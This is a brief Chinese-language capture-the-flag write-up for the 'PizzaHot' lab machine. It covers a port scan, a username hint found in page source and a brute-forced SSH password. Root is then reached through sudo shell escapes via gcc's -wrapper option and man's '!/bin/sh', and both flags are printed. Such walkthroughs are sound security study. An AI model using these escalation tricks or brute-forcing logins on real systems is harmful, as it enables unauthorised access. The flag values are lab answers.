# PizzaHot

2025.03.06 https://thehackerslabs.com/pizzahot/

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 web 源代码发现提示：Puedes creer que hay fanáticos de la pizza de piña que se ponen de usuario pizzapiña 说有个用户名 pizzapiña , 没有 vhost 也没发现其他目录，发现了这个提交邮件的连接 http://pizzahot.thl/forms/contact.php 和 http://pizzahot.thl/forms/book-a-table.php 但是都没什么信息暴露出来。

只好先用 pizzapiña 爆破下 ssh 登陆密码：

```
[22][ssh] host: 192.168.5.39   login: pizzapiña   password: steven
```

进行 ssh 登陆, sudo -l 发现 (pizzasinpiña) /usr/bin/gcc 切换到这个用户：

```
sudo -u pizzasinpiña gcc -wrapper /bin/sh,-s .
```

进入到 home，拿到 user flag:

```
$ cat user.txt
30b8126445b2c50488528c8a78416b0d
```

再次 sudo -l 显示：

```
(root) NOPASSWD: /usr/bin/man
(ALL) NOPASSWD: /usr/bin/sudo -l
```

可以直接提到 root：

```
sudo man man
!/bin/sh
```

拿到 root flag：

```
# cat root.txt
b41668f520aa366c275391ddd0a47683
```
